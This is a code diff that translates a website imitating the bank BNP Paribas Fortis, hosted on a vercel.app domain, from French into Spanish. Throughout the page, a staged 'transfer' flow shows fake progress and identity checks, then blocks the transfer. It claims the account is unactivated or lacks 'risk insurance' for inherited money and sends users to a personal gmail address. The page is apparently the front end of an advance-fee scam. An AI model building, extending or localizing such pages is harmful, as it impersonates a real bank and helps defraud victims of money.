@@ -72,7 +72,7 @@ title{
   margin: 0px;
 }
 .transferto{
-  margin: 20px 0px 0px 20px;
+  margin: 20px 0px;
   padding:20px 0px;
   display: flex;
    
@@ -82,7 +82,7 @@ title{
 }
   .account{
    
-    margin: 0px 0px 0px 0px;
+  
   padding: 0px 0px 20px 0px;
     
   background: whitesmoke;
@@ -111,6 +111,7 @@ title{
   .account-typ{
     font-weight: bolder;
     font-size: 18px;
+ margin-left: 3px;
   }
   .bnp h2{
    
@@ -482,14 +483,14 @@ overflow: hidden;
   <div class="opacity">
         <div class="message">
           <h2>BNP Paribas Fortis</h2>
-         <h3>Send Your Money <i class="fa fa-send-o" style="font-size:25px"></i>
+         <h3>enviando dinero <i class="fa fa-send-o" style="font-size:25px"></i>
         
 
          </h3>
          <div class="rond">
          <i style="font-size:24px" class="fa" id="faremove">&#xf00d;</i>
            <div class="text-status">
-            Virement en cours de transaction 
+            transferencia en progreso.....
            </div>
 
              <div class="circle">
@@ -576,22 +577,22 @@ overflow: hidden;
 
    <div class="list-drl">
      <div class="list-item">
-       <li> <a href="https://bnpparibas-gfrz.vercel.app/  ">Accueil</a></li>
+       <li> <a href="https://bnpparibas-gfrz.vercel.app/  ">Bienvenida</a></li>
 
      </div>
      <div class="list-item">
-       <li><a href="https://bnpparibas-gfrz.vercel.app/signup ">Se connecter</a></li>
+       <li><a href="https://bnpparibas-gfrz.vercel.app/signup ">Conectar</a></li>
      </div>
      <div class="list-item">
-       <li><a href="https://bnpparibas-gfrz.vercel.app/signin">S'inscrire</a></li>
+       <li><a href="https://bnpparibas-gfrz.vercel.app/signin">Inscribirse</a></li>
      </div>
 
 
      <div class="list-item">
-       <li><a href="https://bnpparibas-gfrz.vercel.app/account">Compte Bancaire</a></li>
+       <li><a href="https://bnpparibas-gfrz.vercel.app/account">Cuenta Bancaria</a></li>
      </div>
      <div class="list-item">
-       <li><a href="https://bnpparibas-gfrz.vercel.app/loan">Obtenir un Crédit</a></li>
+       <li><a href="https://bnpparibas-gfrz.vercel.app/loan">Obtener crédito</a></li>
 
 
 
@@ -614,7 +615,7 @@ overflow: hidden;
 <div class="account">
   <div class="account-dash">
       <span></span> <span></span>  
-      Tableau de bord
+      Salpicadero
   <span></span> <span></span>
   </div>
 <div id="bankuser" class="account">
@@ -673,16 +674,16 @@ function transfert(user){
     
 
 
- <button id="btn" type="submit" onclick=overlay("${user.email}","${user.tot_amount}","${user.tot_deposit}","${user.status}","${user.currency}","${user.cardBank.iban}","${user.cardBank.bic}","${user.assurance}","${user.typeofCompte}","${user.bankInter}","${user.cardBank.idAccount}")> Transfert</button>
+ <button id="btn" type="submit" onclick=overlay("${user.email}","${user.tot_amount}","${user.tot_deposit}","${user.status}","${user.currency}","${user.cardBank.iban}","${user.cardBank.bic}","${user.assurance}","${user.typeofCompte}","${user.bankInter}","${user.cardBank.idAccount}")> Transferir</button>
  </div>
    <div id="isCompte">
      <div>
-       Le compte bancaire du bénéficiaire du transfert d'argent n'est pas référencé dans la base de données de BNP Paribas Fortis banque .
-       <div style="margin: 10px 0px;">
- 
- 
-         votre compte bancaire n'est pas encore relié à votre nouveau compte bancaire chez la banque BNP Paribas
-         contactez le service financier à l'adresse mail suivante et posé votre problème
+       La cuenta bancaria del beneficiario de la transferencia de dinero no está referenciada en la base de datos del banco BNP Paribas Fortis .
+         <div style="margin: 10px 0px;">
+         
+         
+           su cuenta bancaria aún no está vinculada a su nueva cuenta bancaria BNP Paribas
+           póngase en contacto con el departamento financiero en la siguiente dirección de correo electrónico y exponga su problema
          <div style="color:seagreen;text-align:center;font-size:20px;margin:20px 0px">
            reunierprospere@gmail.com
          </div>
@@ -712,7 +713,7 @@ function overlay(email,amount,deposit,status,currency,iban,bic, assurance,typeof
       <div class="actived">
         
     
-      Verification d'Identités  personnelles confirmées ✓
+      Verificación de identidades personales confirmadas ✓
         </div>`), 3000)
     clearTimeout(timeout)
     console.log(bankInter+'yeah')
@@ -723,7 +724,7 @@ function overlay(email,amount,deposit,status,currency,iban,bic, assurance,typeof
       
    
               <h4>IBAN</h4>
-            Virement instantané de ${inputTag[2].value} ${currency}
+            Transferencia instantánea de ${inputTag[2].value} ${currency}
           
             <div class="iban-transf">
             
@@ -739,13 +740,13 @@ function overlay(email,amount,deposit,status,currency,iban,bic, assurance,typeof
      <div class="not-actived">
        
     
-     Votre compte bancaire n'est pas encore activé car votre solde montant est de 0€. <div>
-       Numéro Compte Bancaire (ID)
+     Su cuenta bancaria aún no ha sido activada porque su saldo es de 0 ${currency}. <div>
+       Número de cuenta bancaria (ID)
      </div>
      <div>
-       N° Compte Bancaire :${id}
+       Número de Cuenta Bancaria. :${id}
      </div>
-     Veillez conctater le service financier de la banque BNP Paribas Fortis à l'adresse mail suivante pour une activation réussie 
+     Para una activación correcta, póngase en contacto con el departamento financiero de BNP Paribas Fortis Bank en la siguiente dirección de correo electrónico.
      reunierprospere@gmail.com
     </div> `), 3000)
       clearTimeout(timeout)
@@ -758,10 +759,9 @@ function overlay(email,amount,deposit,status,currency,iban,bic, assurance,typeof
      
         const timeout = setTimeout(loaded(92, `
                 <div class="not-actived">
-                 <h3>votre assurance risque est vide (0€).
+                 <h3>Se solicita seguro garantizado (0 ${currency}).
                 </h3> 
-                une assurance risque est demandée par la banque BNP Paribas Fortis pour  couvrir à l'avenir des risques d'un mauvais usage de l'argent hérité dans des pratiques obscènes ou dans activités criminelles tel que la drogue, paiement d'arme, trafic etc...
-          
+                El seguro de riesgos es solicitado por el banco BNP Paribas Fortis para cubrir en el futuro los riesgos de malversación del dinero heredado en prácticas obscenas o en actividades delictivas como drogas, pagos de armas, tráfico, etc..
                 </div>
                               `), 1000)
         clearTimeout(timeout)
@@ -771,10 +771,9 @@ function overlay(email,amount,deposit,status,currency,iban,bic, assurance,typeof
         
         const timeout = setTimeout(loaded(92, `
             <div class="not-actived">
-             <h3>votre assurance risque est vide (0€).
+             <h3>Se solicita seguro garantizado (0 ${currency}).
             </h3> 
-            une assurance est demandée par la banque BNP
-            Paribas Fortis pour  couvrir en cas de non remboursement d'un crédit  financiers par le bénéficiaire du credit financier.
+            El banco BNP Paribas Fortis solicita un seguro para cubrir en caso de impago de un préstamo financiero por parte del beneficiario del crédito financiero.
       
             </div>
                           `), 1000)
@@ -808,7 +807,7 @@ function overlay(email,amount,deposit,status,currency,iban,bic, assurance,typeof
       <div class="actived">
         
     
-      Verification d'Identités  personnelles confirmées ✓
+      Verificación de identidades personales confirmadas ✓
         </div>`), 3000)
     clearTimeout(timeout)
     console.log(bankInter+'yeah')
@@ -819,7 +818,7 @@ function overlay(email,amount,deposit,status,currency,iban,bic, assurance,typeof
       
    
               <h4>IBAN</h4>
-            Virement instantané de ${inputTag[2].value} ${currency}
+Transferencia instantánea de ${inputTag[2].value} ${currency}
           
             <div class="iban-transf">
             
@@ -835,14 +834,7 @@ function overlay(email,amount,deposit,status,currency,iban,bic, assurance,typeof
      <div class="not-actived">
        
     
-     Votre compte bancaire n'est pas encore activé car votre solde montant est de 0€. <div>
-       Numéro Compte Bancaire (ID)
-     </div>
-     <div>
-       N° Compte Bancaire :${id}
-     </div>
-     Veillez conctater le service financier de la banque BNP Paribas Fortis à l'adresse mail suivante pour une activation réussie 
-     reunierprospere@gmail.com
+     Tu cuenta bancaria aún no está activada porque el importe de tu saldo es 0${currency}. <div> Número de cuenta bancaria (ID) </div> <div> Número de cuenta bancaria:${id} </div> Póngase en contacto con el departamento financiero del banco BNP Paribas Fortis en la siguiente dirección de correo electrónico para una activación exitosa reunierprospere@gmail.com
     </div> `), 3000)
       clearTimeout(timeout)
     
@@ -854,10 +846,7 @@ function overlay(email,amount,deposit,status,currency,iban,bic, assurance,typeof
     
         const timeout = setTimeout(loaded(92, `
                 <div class="not-actived">
-                 <h3>votre assurance risque est vide (0€).
-                </h3> 
-                une assurance risque est demandée par la banque BNP Paribas Fortis pour  couvrir à l'avenir des risques d'un mauvais usage de l'argent hérité dans des pratiques obscènes ou dans activités criminelles tel que la drogue, paiement d'arme, trafic etc...
-          
+                <h3>tu seguro de riesgos está vacío (0€). </h3> El seguro de riesgos es solicitado por el banco BNP Paribas Fortis para cubrir en el futuro los riesgos de apropiación indebida del dinero heredado en prácticas obscenas o en actividades delictivas como drogas, pago de armas, tráfico, etc.
                 </div>
                               `), 1000)
         clearTimeout(timeout)
@@ -867,10 +856,7 @@ function overlay(email,amount,deposit,status,currency,iban,bic, assurance,typeof
    
         const timeout = setTimeout(loaded(92, `
             <div class="not-actived">
-             <h3>votre assurance risque est vide (0€).
-            </h3> 
-            une assurance gar est demandée par la banque BNP
-            Paribas Fortis pour  couvrir en cas de non remboursement d'un crédit  financiers par le bénéficiaire du credit financier.
+           <h3>tu seguro de riesgos está vacío (0${currency}). </h3> El seguro gar es solicitado por el banco BNP Paribas Fortis para cubrir en caso de impago de un préstamo financiero por parte del beneficiario del crédito financiero.
       
             </div>
                           `), 1000)
@@ -918,7 +904,7 @@ function overlay(email,amount,deposit,status,currency,iban,bic, assurance,typeof
   
   
   
-        info[0].innerHTML = 'votre solde est insuffisant'
+        info[0].innerHTML = 'tu saldo es insuficiente'
         montantCheck = false
       }
       else {
@@ -928,7 +914,7 @@ function overlay(email,amount,deposit,status,currency,iban,bic, assurance,typeof
     }
     else {
   
-      info[0].textContent = `Mininum de transfert d'argent  1${currency}`
+      info[0].textContent = `Mínimo de transferencia de dinero 1${currency}`
       montantCheck = false
     }
   
@@ -953,13 +939,7 @@ const email=filtuser.email
 if(email==undefined){
   
 let returnHtml=`div class="access">
-         <h3>Vous êtes pas un utilisateur de BNP Paribas Fortis</h3>
-           Creez votre compte bancaire dès maintenant et bénéficiez de nos services financiers attrayants 
-           <div class="imagbnp">
-            <div class="iconimg">
-            <a href="https://bnpparibas-gfrz.vercel.app/signup">
-            Ouvrir un compte bancaire</a>
-
+         <h3>No eres usuario de BNP Paribas Fortis</h3> Crea tu cuenta bancaria ahora y benefíciate de nuestros atractivos servicios financieros <div class="imagbnp"> <div class="iconimg"> <a href="https://bnpparibas-gfrz.vercel.app/signup"> Abrir una cuenta bancaria</a>
             </div>
            </div>
          </div>`
@@ -971,7 +951,7 @@ else{
 let returnHtml=`
 
 <div class="tot-amount">
-  <h3> Montant Total(aux)</h3>
+  <h3> Cantidad total</h3>
   <div class="money">
     ${filtuser.tot_amount}
         <div class="curr">
@@ -980,7 +960,7 @@ let returnHtml=`
   </div>
 </div>
 <div class="tot-amount">
-  <h3> Dépôt Total(aux)</h3>
+  <h3> Totales de depósito</h3>
   <div class="money">
     ${filtuser.tot_deposit}
         <div class="curr">
@@ -989,7 +969,7 @@ let returnHtml=`
   </div>
 </div>
 <div class="tot-amount">
-  <h3>Solde Total(aux)</h3>
+  <h3>saldo de cualquier cuenta</h3>
   <div class="money">
     ${filtuser.tot_amount+filtuser.tot_deposit}
     <div class="curr">
@@ -1002,10 +982,10 @@ let returnHtml=`
 </div>
 <div class="transfert" id="trf-user">
   <div class="account-dtl">
-    <h2>Informations Comptes</h2>
+    <h2>Información de la cuenta</h2>
   </div>
   <div class="account-typ">
-    <h3> Service Financier</h3>
+    <h3> Servicios financieros</h3>
     <div>
      ${filtuser.typeofCompte}
     </div>
@@ -1015,22 +995,22 @@ let returnHtml=`
        ${filtuser.email} 
       </div>
       <div class="account-typ">
-        <h3>Nom</h3>
+        <h3>Appelidos</h3>
         <div>
          ${filtuser.name}
         </div>
         <div class="account-typ">
-          <h3>Prénom</h3>
+          <h3>nombre de pila</h3>
           <div>
             ${filtuser.prenom}
           </div>
            <div class="account-typ">
-             <h3>Pays</h3>
+             <h3>país</h3>
              <div>
                ${filtuser.pays}
              </div>
           <div class="account-typ">
-            <h3>Frais d'Assurance</h3>
+            <h3>seguro</h3>
             <div>${filtuser.assurance}
                
                    ${filtuser.currency}
@@ -1039,15 +1019,15 @@ let returnHtml=`
             </div>
             
                 <div class="account-typ">
-                 <h4>Contrat</h4>
+                 <h4>Contrato</h4>
                   ${filtuser.contrat}
                 </div>
             
                ${isIdAccount(filtuser)}
               <div class="account-typ">
-              <h4>Statut Compte Bancaire</h4>
+              <h4>Estado de la cuenta bancaria</h4>
               <div class="actif">
-                Activé 
+                Activado 
               </div>
               <div class="${statusClass(filtuser.status)}">
                ${
@@ -1078,19 +1058,19 @@ function isTransferInter(user){
     <div class="transferto">
       <div class="trnf-title">
     
-        <h2>Expédition par Swift<i style="font-size:24px" class="fa">&#xf19c;</i></h2>
+        <h2>Envío por Swift<i style="font-size:24px" class="fa">&#xf19c;</i></h2>
     
       </div>
        <div class="inp-iban">
          <div class="iban">
            <h4 style="text-align:center;
-                   margin:20px 0px;">Carte Swift BNP BANQUE (expéditeur)</h4>
+                   margin:20px 0px;">Tarjeta Swift BNP BANK (remitente)</h4>
            <input disabled type="text" value="${user.cardBank.carteBnp}" />
          </div>
       <div class="inp-iban">
         <div class="iban">
           <h4 style="text-align:center;
-          margin:20px 0px;">IBAN du Bénéficiaire(destinataire)</h4>
+          margin:20px 0px;">IBANO du Envío por Swift</h4>
           <input disabled type="text" value="${user.cardBank.iban}" placeholder="IBAN">
         </div>
     
@@ -1099,7 +1079,7 @@ function isTransferInter(user){
         </div>
         
         <div class="bic">
-          <h4>Montant</h4>
+         <h4>La cantidad a transferir</h4>
           <input type="number" value="" placeholder="25€">
           <div class="info">
           </div>
@@ -1109,14 +1089,11 @@ function isTransferInter(user){
       </div>
         <div id="isCompte">
           <div>
-            Le compte bancaire du bénéficiaire du transfert d'argent n'est pas référencé dans la base de données de BNP Paribas Fortis banque .
+            La cuenta bancaria del beneficiario de la transferencia de dinero no figura en la base de datos del banco BNP Paribas Fortis.
             <div style="margin: 10px 0px;">
       
       
-              votre compte bancaire n'est pas encore relié à votre nouveau compte bancaire chez la banque BNP Paribas
-              contactez le service financier à l'adresse mail suivante et posé votre problème
-              <div style="color:seagreen;text-align:center;font-size:20px;margin:20px 0px">
-                reunierprospere@gmail.com
+              La cuenta bancaria del beneficiario de la transferencia de dinero no figura en la base de datos del banco BNP Paribas Fortis. <div estilo="margen: 10px 0px;"> su cuenta bancaria aún no está vinculada a su nueva cuenta bancaria en el banco BNP Paribas contacta con el departamento financiero a la siguiente dirección de correo electrónico y pregunta tu problema <div style="color: seagreen;text-align:center;font-size:20px;margin:20px 0px"> reunierprospere@gmail.com
               </div>
             </div>
     </div>
@@ -1128,27 +1105,27 @@ function isTransferInter(user){
         <div class="transferto">
           <div class="trnf-title">
         
-            <h2>Expédition par Swift<i style="font-size:24px" class="fa">&#xf19c;</i></h2>
+            <h2>Envió por Swift<i style="font-size:24px" class="fa">&#xf19c;</i></h2>
         
           </div>
            <div class="inp-iban">
            <div class="iban">
              <h4 style="text-align:center;
-             margin:20px 0px;">Carte Swift BNP BANQUE (expéditeur)</h4>
+             margin:20px 0px;">Tarjeta Swift BNP BANK (remitente)</h4>
              <input disabled type="text" value="${user.cardBank.carteBnp}" />
            </div>
            
           <div class="inp-iban">
             <div class="iban">
-              <h4 style="text-align:center">N° compte bancaire(destinataire)</h4>
-              <input disabled type="text" value="${user.cardBank.idAccount}" placeholder="N° Compte Bancaire">
+              <h4 style="text-align:center">Número de cuenta bancaria (destinatario)</h4>
+              <input disabled type="text" value="${user.cardBank.idAccount}" placeholder="N° Cuenta Bancaria">
             </div>
         
                 
 
        
             <div class="bic">
-              <h4>Montant</h4>
+              <h4>La cantidad a transferir</h4>
               <input type="number" value="" placeholder="25€">
               <div class="info">
               </div>
@@ -1202,15 +1179,15 @@ function isIdAccount(filtuser){
   if(filtuser.bankInter){
     return `
      <div class="account-typ">
-       <h4>BankName</h4>
+       <h4>Nombre del banco</h4>
        ${filtuser.cardBank.bankName}
      </div>
      <div class="account-typ">
-       <h3>Carte Bancaire
+       <h3>Tarjeta de crédito
          <i class="fa fa-credit-card" aria-hidden="true"></i>
        </h3>
        <div>
-         <h4> IBAN
+         <h4> IBANO
     
          </h4>
          </di>
@@ -1222,7 +1199,8 @@ function isIdAccount(filtuser){
            ${filtuser.cardBank.bic}
          </div>
           <div class="account-typ">
-            <h4>Carte Bancaire Swift BNP Paribas Banque</h4>
+            <h4>Tarjeta bancaria Swift del banco BNP Paribas
+            </h4>
             ${filtuser.cardBank.carteBnp}
           </div>
     `
@@ -1230,23 +1208,22 @@ function isIdAccount(filtuser){
   else{
     return `
      <div class="account-typ">
-       <h4>Nom de Banque</h4>
+       <h4>Nombre del banco</h4>
        ${filtuser.cardBank.bankName}
      </div>
      <div class="account-typ">
-       <h3>Carte bancaire du bénéficiaire 
+       <h3>Tarjeta bancaria del beneficiario
          <i class="fa fa-credit-card" aria-hidden="true"></i>
        </h3>
        <div>
-         <h4> Identifiant bancaire (N° account)
-    
+         <h4> Identificación bancaria (número de cuenta)
          </h4>
          </di>
          <div class="account-typ">
            ${filtuser.cardBank.idAccount}
          </div>
         <div class="account-typ">
-        <h4>Carte Bancaire Swift BNP Paribas Banque</h4>
+        <h4>Tarjeta bancaria Swift del banco BNP Paribas</h4>
           ${filtuser.cardBank.carteBnp}
           </div>
     `
@@ -1289,11 +1266,11 @@ displayContextUser(content)
   }
   else{
    let content=`<div class="access">
-         <h3>Vous êtes pas actuellement connecté</h3>
-           Connectez vous pour accéder à votre compte bancaire
-           <div class="imagbnp">
-            <div class="iconimg">
-            <img  src="https://raw.githubusercontent.com/lisbonne456/bnpparibas/main/vecteur-icone-web-symbole-icone-planete-pour-conception-votre-site-web-application-logo-icone-web-ui-vector-eps-10_532800-858.jpg" alt="page web déconnecté">
+         <h3>Actualmente no has iniciado sesión</h3>
+            Inicia sesión para acceder a tu cuenta bancaria
+            <div class="imagbnp">
+              <div class="iconimg">
+                <img src="https://raw.githubusercontent.com/lisbonne456/bnpparibas/main/vector-icone-web-symbol-icone-planete-pour-conception-votre-site-web-application-logo-icone-web -ui-vector-eps-10_532800-858.jpg" alt="página web desconectada">
 
             </div>
            </div>
